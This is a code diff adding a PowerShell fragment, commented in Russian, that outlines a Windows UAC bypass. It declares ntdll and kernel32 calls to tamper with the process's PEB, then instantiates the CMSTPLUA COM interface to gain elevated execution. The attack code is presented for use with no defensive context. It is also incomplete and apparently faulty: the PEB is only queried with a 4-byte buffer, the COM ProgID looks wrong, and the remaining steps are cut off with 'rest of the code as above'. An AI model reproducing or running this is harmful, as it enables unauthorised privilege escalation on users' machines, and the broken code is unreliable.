@@ -1,0 +1,23 @@
+# 1. Сначала меняем PEB нашему процессу
+$ScriptBlock = {
+    $K32 = Add-Type -MemberDefinition @"
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetCurrentProcess();
+        [DllImport("ntdll.dll")]
+        public static extern int NtQueryInformationProcess(IntPtr hProcess, int procInfoClass, ref uint procInfo, uint procInfoLength, ref uint retLength);
+        [DllImport("ntdll.dll")]
+        public static extern void RtlEnterCriticalSection(IntPtr ptr);
+        [DllImport("ntdll.dll")]
+        public static extern void RtlLeaveCriticalSection(IntPtr ptr);
+"@ -Name "K32" -Namespace "Win32" -PassThru
+    
+    # Манипуляции с PEB
+    $hProcess = $K32::GetCurrentProcess()
+    $peb = 0
+    $len = 0
+    $K32::NtQueryInformationProcess($hProcess, 0, [ref]$peb, 4, [ref]$len)
+}
+
+# 2. Затем вызываем CMSTPLUA
+$c = New-Object -ComObject "CMSTPLUA.CMStplUI"
+# ... остальной код как выше
